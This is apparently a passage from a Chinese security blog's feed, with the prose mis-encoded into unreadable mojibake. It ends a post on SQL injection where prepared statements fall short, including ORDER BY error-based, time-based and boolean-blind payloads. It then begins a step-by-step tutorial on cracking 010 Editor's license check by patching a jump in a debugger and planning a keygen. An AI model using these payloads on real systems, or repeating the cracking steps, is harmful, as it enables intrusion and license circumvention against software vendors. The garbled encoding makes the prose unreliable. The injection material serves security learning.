ä¸ºåœ¨ç»‘å®šå‚æ•°æ—¶åŒ…å«ï¼…,è€Œä¸æ˜¯åœ¨SQLæœ¬èº«(é¢„å…ˆå‡†å¤‡å¥½çš„è¯­å¥)ä¸­,è¿™æ˜¯ä¸èµ·ä½œç”¨ã€‚æ‰€ä»¥è¿™ç§æƒ…å†µä¸‹ï¼Œå¼€å‘å¯èƒ½ä¼šé€‰æ‹©ç›´æ¥ä½¿ç”¨æ‹¼æ¥è¯­å¥ï¼Œè¿™å°±ç»™äº†SQLæ³¨å…¥çš„å¯èƒ½ã€‚</p><p>ä½†æ˜¯ï¼Œä¹Ÿä¸æ˜¯æ²¡æœ‰åŠæ³•åœ¨ä½¿ç”¨likeçš„æƒ…å†µä¸‹è¿›è¡Œé¢„ç¼–è¯‘ï¼Œéœ€è¦è°ƒç”¨ä¸€äº›ï¼ŒMySQLçš„å†…ç½®å‡½æ•°ï¼Œä¾‹å¦‚å°†ä¸Šè¿°çš„æŸ¥è¯¢è¯­å¥æ›´æ”¹ä¸ºå¦‚ä¸‹å½¢å¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from fraction where name like concat(&#x27;%&#x27;,:username,&#x27;%&#x27;)<br># è¿™ç§æƒ…å†µä¸‹å°±èƒ½å¤Ÿè¿›è¡Œåœ¨ä½¿ç”¨é¢„ç¼–è¯‘çš„æƒ…å†µä¸‹è¿›è¡Œlikeæ¨¡ç³ŠæŸ¥è¯¢<br></code></pre></td></tr></table></figure><h5 id="order-byåä¼ å…¥å­—æ®µå"><a href="#order-byåä¼ å…¥å­—æ®µå" class="headerlink" title="order byåä¼ å…¥å­—æ®µå"></a>order byåä¼ å…¥å­—æ®µå</h5><p>order by ç®€å•ç”¨æ³•</p><p><strong>ä½œç”¨</strong>ï¼šç”¨äºå¯¹ç»“æœé›†è¿›è¡Œæ’åºã€‚</p><p><strong>è¯­æ³•ï¼š</strong>é¡ºåºï¼šSELECT * from è¡¨å ORDER BY æ’åºçš„å­—æ®µå å€’åºï¼šSELECT * from è¡¨å ORDER BY æ’åºçš„å­—æ®µå DESC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">[ORDER BY &#123;col_name | expr | position&#125;  <br>[ASC | DESC], ...]  <br></code></pre></td></tr></table></figure><p><strong>æ³¨</strong>ï¼šORDER BY è¯­å¥ç”¨äºæ ¹æ®æŒ‡å®šçš„åˆ—å¯¹ç»“æœé›†è¿›è¡Œæ’åºã€‚ORDER BY è¯­å¥é»˜è®¤æŒ‰ç…§å‡åºå¯¹è®°å½•è¿›è¡Œæ’åºã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from fraction order by fraction DESC;# æ ¹æ®å­—æ®µfractionè¿›è¡Œé™åºæ’åˆ—<br>select * from fraction order by fraction ASC;# æ ¹æ®å­—æ®µfractionè¿›è¡Œå‡åºæ’åˆ—<br></code></pre></td></tr></table></figure><p><code>order by</code>ä½ç½®çš„æ³¨å…¥ç‚¹ï¼Œå…¶å®è·Ÿå¹³å¸¸çš„æ³¨å…¥ç‚¹ç±»ä¼¼ï¼Œç›®å‰æ„Ÿè§‰åŒºåˆ«ä¸å¤§ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from fraction order by 1 and 1=updatexml(0,concat(&#x27;~&#x27;,user(),&#x27;~&#x27;),1)# asc;-- æŠ¥é”™æ³¨å…¥<br>select * from fraction order by updatexml(0,concat(&#x27;~&#x27;,user(),&#x27;~&#x27;),1)# asc;-- æŠ¥é”™æ³¨å…¥<br>select * from fraction order by if(1,sleep(3),sleep(0))# asc;-- å»¶æ—¶ç›²æ³¨ï¼Œä½†è¿™ä¸ªå»¶æ—¶äº†33ç§’ï¼Œç¦»è°±<br>select * from fraction order by if((user()=&#x27;root@localhost&#x27;),fraction,id);# asc;-- å¸ƒå°”ç›²æ³¨<br></code></pre></td></tr></table></figure><p>okï¼Œå›å½’æ­£é¢˜ï¼Œæœ‰æ—¶ORDER BYåçš„è¡¨ååŠ¨æ€ä¼ å…¥çš„SQLè¯­å¥ï¼›æ¸—é€æµ‹è¯•ä¸­å…è®¸ç”¨æˆ·ä¼ å…¥æŒ‰æŸä¸ªå­—æ®µè¿›è¡Œæ’åºçš„è¡Œä¸ºï¼Œè¿™å¾ˆæœ‰å¯èƒ½æ˜¯ç›´æ¥æ‹¼æ¥çš„ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$col</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;col&#x27;</span>]; <span class="hljs-comment">// æ¥æ”¶username</span><br><br><span class="hljs-comment"># å»ºç«‹æ•°æ®åº“è¿æ¥</span><br><span class="hljs-variable">$dbs</span> = <span class="hljs-string">&quot;mysql:host=127.0.0.1;dbname=sort&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$passwd</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><br><span class="hljs-comment">// åˆ›å»ºè¿æ¥,é€‰æ‹©æ•°æ®åº“,æ£€æµ‹è¿æ¥</span><br><span class="hljs-keyword">try</span>&#123;<br><span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> PDO(<span class="hljs-variable">$dbs</span>, <span class="hljs-variable">$dbname</span>, <span class="hljs-variable">$passwd</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sucussful&lt;br/&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>)&#123;<br><span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;Error!: &quot;</span> . <span class="hljs-variable">$e</span>-&gt;getMessage() . <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>);<br>&#125;<br><br><span class="hljs-comment"># è®¾ç½®æœ¬åœ°é¢„ç¼–è¯‘ï¼Œç»‘å®šå‚æ•°</span><br><span class="hljs-variable">$conn</span> -&gt; setAttribute(PDO::ATTR_EMULATE_PREPARES, <span class="hljs-literal">false</span>);<br><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$conn</span>-&gt;prepare(<span class="hljs-string">&quot;select * from fraction order by :col&quot;</span>);<br><span class="hljs-variable">$stmt</span>-&gt;bindParam(<span class="hljs-string">&quot;:col&quot;</span>,<span class="hljs-variable">$col</span>);<br><span class="hljs-variable">$stmt</span>-&gt;execute();<br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$stmt</span>-&gt;fetchAll(PDO::FETCH_ASSOC);<br>print_r(<span class="hljs-variable">$result</span>);<br><br><span class="hljs-variable">$conn</span>=<span class="hljs-literal">null</span>; <span class="hljs-comment"># å…³é—­é“¾æ¥</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä¼ å…¥<code>col=fraction</code>ï¼ŒæŸ¥çœ‹æ•°æ®åº“æ‰§è¡Œæ—¥å¿—ï¼Œèƒ½å¤Ÿå‘ç°å·²ç»æˆåŠŸç»‘å®šå‚æ•°ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">12 Connectroot@localhost on sort using TCP/IP<br>12 Prepareselect * from fraction order by ?<br>12 Executeselect * from fraction order by &#x27;fraction&#x27;<br>12 Close stmt<br>12 Quit<br></code></pre></td></tr></table></figure><p>ä½†æŠŠæ‰§è¡Œçš„è¯­å¥ä»£å…¥æ•°æ®åº“å‘½ä»¤è¡Œä¸­å†çœ‹ï¼Œå‘ç°è¿™ç»“æœä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„å•Š</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/12.png"></p><p>è¿™æ˜¯å› ä¸ºåœ¨è¿›è¡Œå‚æ•°ç»‘å®šçš„æ—¶å€™ï¼Œ$colçš„å€¼æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œåœ¨å°†$colçš„å€¼ç»‘å®šè¿›sqlè¯­å¥ä¸­åï¼Œ:colä»ç„¶æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæœ€ç»ˆä»£å…¥æ•°æ®åº“è¿›è¡Œæ‰§è¡Œçš„è¯­å¥æ˜¯<code>select * from fraction order by &#39;fraction&#39;</code>ï¼Œè€Œorder byä¹‹åéœ€è¦çš„æ˜¯ä¸€ä¸ªè¡¨åï¼Œè¿™ä¸ªè¡¨åä¸èƒ½ä»¥å­—ç¬¦ä¸²çš„å½¢å¼å­˜åœ¨ã€‚å› æ­¤ï¼Œè¯¥ä½ç½®å¤§æ¦‚ç‡ä¼šè¢«å†™æˆæ‹¼æ¥ï¼Œè¿™å°±é€ æˆäº†SQLæ³¨å…¥çš„å¯èƒ½ã€‚</p><h5 id="order-byåä¼ å…¥ASC-DESC"><a href="#order-byåä¼ å…¥ASC-DESC" class="headerlink" title="order byåä¼ å…¥ASC/DESC"></a>order byåä¼ å…¥ASC/DESC</h5><p>æœ‰æ—¶ï¼Œå¯èƒ½ä¼šå­˜åœ¨æ ¹æ®ç”¨æˆ·çš„é€‰æ‹©æ¥è¿›è¡Œæ­£åºæˆ–å€’å™æ’åˆ—ï¼Œè€Œè¿™æ—¶å¦‚æœ<code>ASC/DESC</code>æ˜¯ä»å‰ç«¯åŠ¨æ€ä¼ å…¥çš„ï¼Œé‚£æ­¤å¤„å¤§æ¦‚ç‡ä½¿ç”¨çš„æ˜¯æ‹¼æ¥</p><p>ä¸¾ä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$conn</span>-&gt;prepare(<span class="hljs-string">&quot;select * from fraction order by fraction :asc&quot;</span>);<br></code></pre></td></tr></table></figure><p>å½“ä½¿ç”¨PDOï¼Œå°†é¢„å¤„ç†è¯­å¥å†™æˆè¿™æ ·æ—¶ï¼Œä¼šæŠ›å‡ºé”™è¯¯</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/13.png"></p><p>åœ¨MySQLå‘½ä»¤è¡Œä¸­ï¼Œè¿›è¡Œè¯¥é¢„å¤„ç†è¯­å¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">prepare sel from &quot;select * from fraction order by fraction ?&quot;;<br></code></pre></td></tr></table></figure><p>åŒæ ·ä¼šæŠ›å‡ºé”™è¯¯</p><p><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;?&#39; at line 1</code></p><p>æ‰€ä»¥å½“éœ€è¦å‰ç«¯ä¼ å…¥<code>ASC/DESC</code>æ—¶ï¼Œåç«¯å¤§æ¦‚ç‡ä½¿ç”¨çš„æ˜¯æ‹¼æ¥ï¼Œç”¨äº†æ‹¼æ¥å°±é€ æˆäº†SQLæ³¨å…¥çš„å¯èƒ½</p><h4 id="æœ€åçš„æœ€å"><a href="#æœ€åçš„æœ€å" class="headerlink" title="æœ€åçš„æœ€å"></a>æœ€åçš„æœ€å</h4><p>ç›®å‰æ‰€äº†è§£åˆ°çš„åŸºæœ¬ä¸Šå°±è¿™äº›ï¼Œçœ‹ç½‘ä¸Šè¯´è¿˜æœ‰â€IN è¯­å¥ä¹‹åâ€ï¼Œä½†æ˜¯ç»è¿‡æµ‹è¯•ä¹‹åå‘ç°<code>IN</code>è¯­å¥ä¹‹åèƒ½å¤Ÿæ­£å¸¸ä½¿ç”¨é¢„å¤„ç†ï¼Œ<code>IN</code>è¯­å¥ä¹‹åè‹¥å­˜åœ¨SQLæ³¨å…¥çš„è¯å¤§æ¦‚ç‡å°±æ˜¯æ‹¼æ¥ï¼Œè€Œæ‹¼æ¥çš„è¯å°±è·Ÿæ™®é€šçš„æ³¨å…¥åŒºåˆ«ä¸å¤§äº†ï¼Œæ‰€ä»¥å°±æ²¡æœ‰å†™å…³äº<code>IN</code>è¯­å¥ä¹‹åçš„ã€‚æ–‡ç« é‡Œé¢ä¼°è®¡æœ‰ä¸€äº›é”™è¯¯çš„åœ°æ–¹ï¼Œä»¥åŠä¸€äº›æ²¡æœ‰è¯´æ¸…çš„åœ°æ–¹ï¼Œåé¢ç¿»çœ‹çš„æ—¶å€™å¦‚æœå‘ç°äº†å°±å†æ›´æ–°ï¼Œæ¯•ç«Ÿç°åœ¨èœçš„ç¦»è°±ï¼Œå†™é”™äº†ä¹Ÿä¸çŸ¥é“é”™äº†ï¼›è¿˜æœ‰å°±æ˜¯è‚¯å®šæœ‰ä¸€äº›ä¸èƒ½ä½¿ç”¨é¢„ç¼–è¯‘æˆ–é¢„ç¼–è¯‘å¯èƒ½å­˜åœ¨çš„é—®é¢˜æ²¡æœ‰å†™åˆ°ï¼Œåé¢å¦‚æœå­¦ä¹ åˆ°æˆ–è€…é‡åˆ°çš„æ—¶å€™è¦è¡¥å……è¿›æ¥çš„ã€‚æœ€åçš„æœ€åï¼Œè¯¥å»æƒ³åŠæ³•æ¡ç‚¹åƒåœ¾åƒæ™šé¥­äº†</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/14.png"></p><h4 id="å‚è€ƒé“¾æ¥ï¼š"><a href="#å‚è€ƒé“¾æ¥ï¼š" class="headerlink" title="å‚è€ƒé“¾æ¥ï¼š"></a>å‚è€ƒé“¾æ¥ï¼š</h4><p><a href="https://www.cnblogs.com/Cyangsec/p/13067369.html">https://www.cnblogs.com/Cyangsec/p/13067369.html</a></p><p><a href="https://blog.nowcoder.net/n/9d9987c816214f62b9266276da65e11f">https://blog.nowcoder.net/n/9d9987c816214f62b9266276da65e11f</a></p><p><a href="https://blog.nowcoder.net/n/be73b8f592504ae8b1d00368433061be">https://blog.nowcoder.net/n/be73b8f592504ae8b1d00368433061be</a></p><p><a href="https://cloud.tencent.com/developer/news/378220">https://cloud.tencent.com/developer/news/378220</a></p><p><a href="https://xz.aliyun.com/t/7132#toc-11">https://xz.aliyun.com/t/7132#toc-11</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ä¸ºäº†å¤šæ¡ç‚¹åƒåœ¾</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>010 Editor ç ´è§£</title>
    <link href="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/"/>
    <url>/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h3 id="010-Editorç ´è§£"><a href="#010-Editorç ´è§£" class="headerlink" title="010 Editorç ´è§£"></a>010 Editorç ´è§£</h3><p>è¿™ç¯‡æ–‡ç« æ¥è‡ªäºè¿«äºæ— å¥ˆçš„æŠ€æœ¯åˆ†äº«ï¼Œæ²¡å•¥ä¼šçš„ï¼Œåˆä¸èƒ½ä¸å‰é¢é‡å¤ï¼Œäºæ˜¯ä¹æ˜¯èƒ½çœ‹çœ‹ç½‘ä¸Šçš„æ•™ç¨‹è‡ªå·±æ¥ä¸€éäº†ã€‚</p><p>å¯ä»¥è¯´æ˜¯æŠ„çš„ï¼Œä½†ä¹Ÿæœ‰è‡ªå·±çš„åˆ†æä¸å­¦ä¹ ï¼Œæ•…è®°å½•ä¸‹æ¥ã€‚</p><h4 id="1-å‰æœŸå‡†å¤‡"><a href="#1-å‰æœŸå‡†å¤‡" class="headerlink" title="1. å‰æœŸå‡†å¤‡"></a>1. å‰æœŸå‡†å¤‡</h4><h5 id="010Eitor-v9-0-2-64-bit"><a href="#010Eitor-v9-0-2-64-bit" class="headerlink" title="010Eitor v9.0.2 64-bit"></a>010Eitor v9.0.2 64-bit</h5><h5 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h5><ul><li>exeinfope (æŸ¥å£³)</li><li>Xdbg (åŠ¨æ€è°ƒè¯•)</li><li>IDA (é™æ€åˆ†æ)</li><li>PyCharm (ç¼–å†™æ³¨å†Œæœº)</li></ul><h4 id="2-æš´åŠ›ç ´è§£"><a href="#2-æš´åŠ›ç ´è§£" class="headerlink" title="2. æš´åŠ›ç ´è§£"></a>2. æš´åŠ›ç ´è§£</h4><p>ä¸€èˆ¬çš„ç ´è§£ï¼Œå°±æ˜¯é€šè¿‡æ›´æ”¹ä¸€äº›å…³é”®è·³è½¬ï¼Œå°†æœ¬æ¥æŒ‡å‘é”™è¯¯çš„ä½ç½®è¿›è¡Œæ›´æ”¹ï¼Œä½¿å…¶æŒ‡å‘æ­£ç¡®çš„ä½ç½®ï¼Œä»è€Œè·³è¿‡éªŒè¯ï¼Œä½¿è½¯ä»¶åœ¨è¿›è¡ŒéªŒè¯æ—¶ä¼šç›´æ¥èµ°å‘æˆåŠŸï¼›æˆ–è€…è¯´ï¼Œè½¯ä»¶çš„æ³¨å†Œç æ˜¯æ ¹æ®ç”¨æˆ·åè¿›è¡Œä¸€ä¸ªè®¡ç®—ï¼Œæœ€ç»ˆå¾—åˆ°ä¸€ä¸ªæ³¨å†Œç ï¼Œè¿™ç§å¯ä»¥é€šè¿‡è¾“å…¥ç”¨æˆ·åï¼Œç„¶ååœ¨æœ€åè¿›è¡Œå¯¹æ¯”æ—¶è·å–å¾—åˆ°è¯¥ç”¨æˆ·åçš„æ³¨å†Œç ï¼Œè¿™æ ·åŒæ ·èƒ½å¤Ÿå®ç°ç ´è§£çš„æ•ˆæœã€‚</p><h5 id="1ï¼‰ç ´è§£æ€è·¯"><a href="#1ï¼‰ç ´è§£æ€è·¯" class="headerlink" title="1ï¼‰ç ´è§£æ€è·¯"></a>1ï¼‰ç ´è§£æ€è·¯</h5><ul><li>æŸ¥å£³ï¼Œæœ‰å£³è„±å£³ï¼Œæ— å£³è·³è¿‡</li><li>ç¡®å®šæ³¨å†Œç®—æ³•ä½ç½®</li><li>æ‰¾å¯»å…³é”®è·³è½¬ï¼Œå¹¶å°†å…¶æ›´æ”¹æŒ‡å‘æˆåŠŸä½ç½®</li><li>æ‰“åŒ…æ›´æ”¹åçš„æ–‡ä»¶</li></ul><h5 id="2ï¼‰ç ´è§£è¿‡ç¨‹"><a href="#2ï¼‰ç ´è§£è¿‡ç¨‹" class="headerlink" title="2ï¼‰ç ´è§£è¿‡ç¨‹"></a>2ï¼‰ç ´è§£è¿‡ç¨‹</h5><p>ä»<a href="https://www.sweetscape.com/download/previous/">010Edirorå®˜ç½‘</a>ä¸‹è½½v9.0.2ç‰ˆæœ¬ï¼Œç„¶åå®‰è£…ï¼Œè¿™é‡Œæœ¬æ¥æ˜¯æƒ³æ‰¾v9.0.1ç‰ˆæœ¬çš„(å› ä¸ºæ•™ç¨‹ä¸Šé¢æ˜¯v9.0.1)ï¼Œä½†è‹¦äºå®˜ç½‘æ²¡æœ‰æ‰¾åˆ°ï¼Œæ‰€ä»¥åªèƒ½ä¸‹v9.0.2çš„äº†ï¼Œä½†è¿™ä¸¤ä¸ªå®é™…ä¸Šæ²¡å•¥åŒºåˆ«ã€‚å®‰è£…å¥½ä¹‹åï¼Œå°†å®‰è£…å¥½ä¹‹åçš„å¯æ‰§è¡Œæ–‡ä»¶(å¯ä¸æ˜¯å®‰è£…åŒ…)æ‹–å…¥exeinfopeè¿›è¡ŒæŸ¥å£³</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/1.png"></p><p>å¯ä»¥çœ‹åˆ°ç¨‹åºæ— å£³ã€‚å¯ä»¥ç›´æ¥é™„åŠ åˆ°xdbgä¸­è¿›è¡Œåˆ†æ</p><p>ç”±äº010Editoråœ¨Check Licenseï¼Œå½“æ³¨å†Œç ä¸å¯¹æ—¶ï¼Œä¼šæç¤ºé”™è¯¯ä¿¡æ¯ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥é‡‡ç”¨å­—ç¬¦ä¸²è¿›è¡Œå®šä½</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/2.png"></p><p>ä½¿ç”¨xdbg Alt+Aå°†ç¨‹åºé™„åŠ è¿›æ¥</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/3.png"></p><p>å³é”®-æœç´¢-æ‰€æœ‰æ¨¡å—-å­—ç¬¦ä¸²ï¼Œç„¶åæœç´¢åˆšåˆšæŠ¥é”™é¡µé¢ä¸Šçš„å­—ç¬¦ä¸²</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/4.png"></p><p>åŒå‡»è¿›å…¥è¯¥å‡½æ•°ï¼Œä¸Šä¸‹ç¿»ç¿»èƒ½å¤Ÿå‘ç°è¯¥å‡½æ•°ä¸æ­¢æœ‰åˆšåˆšçš„é”™è¯¯ä¿¡æ¯ï¼Œè¿˜æœ‰â€Thank you for purchasing 010 Editor!â€</p><p>æ‰€ä»¥åŸºæœ¬ä¸Šå¯ä»¥ç¡®å®šè¯¥å‡½æ•°å°±æ˜¯Check Licenseå¤„çš„å…³é”®å‡½æ•°ï¼Œåœ¨è¯¥å‡½æ•°å¤´å¤„ä¸‹æ–­ç‚¹ï¼Œç„¶åç‚¹å‡»Check Licenseï¼Œèƒ½å¤Ÿå‘ç°EIPå·²ç»è·³è½¬è‡³è¯¥ä½ç½®ï¼š</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/5.png"></p><p>F8å•æ­¥èµ°ä¸€éè¯¥å‡½æ•°ï¼Œèƒ½å¤Ÿå‘ç°ï¼Œåœ¨é”™è¯¯çš„æ³¨å†Œç æƒ…å†µä¸‹ï¼Œèƒ½å¤Ÿå‘ç°ç¨‹åºæœ‰ä¸¤ä¸ªå…³é”®æ€§çš„è·³è½¬</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/6.png"></p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/7.png"></p><p>åœ¨ç¨‹åºæ­£å¸¸æ‰§è¡Œä¸‹ï¼Œåœ¨èµ°åˆ°0x13FAF7AC2ä½ç½®å¤„ï¼Œä¼šç›´æ¥è·³è½¬åˆ°0x13FAF7BB5å¤„ï¼Œæ­¤æ—¶ebxçš„å€¼åˆä¸ä¸º0xDBï¼Œæ‰€ä»¥ä¼šç»§ç»­è¿›è¡Œè·³è½¬ï¼Œå¹¶ç›´æ¥è·³è½¬åˆ°æ³¨å†Œç é”™è¯¯ä½ç½®ï¼Œæ‰€ä»¥åŸºæœ¬å¯ä»¥åˆ¤å®šè¿™ä¸¤ä¸ªè·³è½¬å°±æ˜¯å…³é”®æ€§çš„ã€‚æ­¤å¤„å‘ä¿¡å•Šâ€ Thank you for purchasing 010 Editor!â€è¿™ä¸ªå­—ç¬¦ä¸²åœ¨ç¬¬äºŒä¸ªè·³è½¬åé¢ï¼Œæ‰€ä»¥å¯ä»¥å°†0x13FAF7BBBå¤„çš„jneä½¿ç”¨nopè¿›è¡Œæ³¨é‡Šæ‰</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/8.png"></p><p>F8ç»§ç»­å•æ­¥æ‰§è¡Œï¼Œèƒ½å¤Ÿå‘ç°010Editorå·²ç»èµ°åˆ°æˆåŠŸçš„ä½ç½®</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/9.png"></p><p>æ­¤æ—¶åŸºæœ¬okï¼Œè®©ç¨‹åºè·‘èµ·æ¥ï¼Œå‘ç°æ˜¾ç¤ºæ³¨å†ŒæˆåŠŸã€‚</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/10.png"></p><p>å°†ä¿®æ”¹ä¹‹åçš„ç¨‹åºè¿›è¡Œè¿›è¡Œä¿å­˜ï¼Œctrl+Pï¼Œä¿®æ”¹è¡¥ä¸ï¼Œå…¨é€‰ä¹‹åç‚¹å‡»ä¿å­˜</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/11.png"></p><p>å°†ä¿å­˜çš„å¯æ‰§è¡Œæ–‡ä»¶æ”¾åˆ°010Editorçš„å®‰è£…ç›®å½•ä¸‹(å› ä¸ºç¨‹åºåœ¨æ‰§è¡Œçš„æ—¶å€™ä¼šè°ƒç”¨ä¸€äº›å…¶ä»–æ–‡ä»¶)ï¼Œç„¶åå³å¯å®ç°ç ´è§£</p><p>è¿™æ ·å­ç ´è§£çš„è¯ï¼Œæ˜¯å­˜åœ¨ä¸€ä¸ªé—®é¢˜çš„ï¼Œå°±æ˜¯åœ¨æ¯ä¸€æ¬¡æ‰“å¼€010Editorçš„æ—¶å€™ï¼Œéƒ½ä¼šè®©å…ˆè¿›è¡Œæ³¨å†Œç çš„æ ¡éªŒï¼Œç„¶åæ‰èƒ½è¿›å…¥è½¯ä»¶ï¼Œå…¶å®æ²¡ä»€ä¹ˆå½±å“ï¼Œä½†æ˜¯çœ‹èµ·æ¥æ€»å½’æ˜¯æœ‰ç‚¹ä¸å®Œç¾ï¼Œæ‰€ä»¥éœ€è¦æ‰¾è¿›è¡Œæ–°ä¸€è½®çš„å°è¯•ï¼Œæ‹ä¸€ä¸‹åˆšåˆšçš„æ€è·¯ï¼š</p><blockquote><p>æœ‰ä¸¤ä¸ªå…³é”®çš„è·³è½¬ï¼Œä¸€ä¸ªæ˜¯  cmp esi,E7  åˆ¤æ–­ESIæ˜¯å¦ä¸º0xE7ï¼Œä¸æ˜¯åˆ™è·³ï¼›å¦ä¸€ä¸ªæ˜¯ cmp ebx,DBï¼Œåˆ¤æ–­EBXæ˜¯å¦ä¸º0xDBï¼Œä¸æ˜¯åˆ™è·³è½¬ï¼Œåˆšåˆšå°†cmp ebx,DBåé¢çš„è·³è½¬nopæ‰ï¼Œä½¿å¾—ç ´è§£æˆåŠŸã€‚å› æ­¤å¯ä»¥å°è¯•æ§åˆ¶EBXçš„å€¼ï¼Œè®©EBX=0xDBï¼Œè¿™æ ·ç¨‹åºå¯èƒ½å°±èµ°ä¸åˆ°å¼¹å‡ºæ•ˆéªŒæ³¨å†Œç çš„é¡µé¢äº†ï¼Œå› ä¸ºåœ¨æ‰“å¼€ç¨‹åºæ—¶ï¼Œç¨‹åºå†…éƒ¨æ ¡éªŒå‘ç°å·²ç»æ³¨å†ŒæˆåŠŸï¼Œæ‰€ä»¥å°±ä¸ä¼šè·³åˆ°æ•ˆéªŒæ³¨å†Œç çš„é¡µé¢ä¸­äº†ï¼ˆçŒœæµ‹ï¼‰ã€‚</p></blockquote><p>OKï¼Œå›åˆ°ç¨‹åºï¼Œå¯»æ‰¾æ§åˆ¶EBXçš„ä½ç½®ï¼Œç”±äºç¨‹åºæ˜¯ç»è¿‡ä¸¤ä¸ªè·³è½¬ä¹‹åç›´æ¥è·³åˆ°éªŒè¯ç é”™è¯¯çš„ä½ç½®ï¼Œæ‰€ä»¥åº”è¯¥åœ¨ç¬¬ä¸€ä¸ªè·³è½¬å‰å¯»æ‰¾æ§åˆ¶ebxå€¼çš„ä½ç½®ã€‚è¿™é‡Œæœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒEAXå¸¸ç”¨ä½œå‡½æ•°è¿”å›å€¼çš„å­˜å‚¨ï¼Œç®€å•ç‚¹è¯´å°±æ˜¯ return 1æ—¶ï¼Œå‡½æ•°æ‰§è¡Œç»“æŸåï¼Œeax=1</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/12.png"></p><p>è¿™é‡Œè°ƒç”¨äº†ä¸¤ä¸ªå‡½æ•°ï¼Œä¸€ä¸ªç¡®å®šESIï¼Œå¦ä¸€ä¸ªç¡®å®šEBXï¼Œå°†ç¨‹åºèµ°åˆ°0x13FE97AC2ï¼Œç„¶åF7æ­¥å…¥ï¼Œå‘ç°è°ƒç”¨çš„010Editor.1402B4820å‡½æ•°ï¼Œè·Ÿè¿›ï¼Œå°†è¯¥å‡½æ•°èµ°ä¸€é</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/13.png"></p><p>å‘ç°è¯¥å‡½æ•°åœ¨0x1402B4861ä½ç½®å¤„å°†eaxçš„å€¼ä¸0xE7è¿›è¡Œæ¯”è¾ƒï¼Œåœ¨é”™è¯¯çš„éªŒè¯ç æƒ…å†µä¸‹ï¼Œæ­¤å¤„ä¼šç›´æ¥è·³èµ°</p><p><img 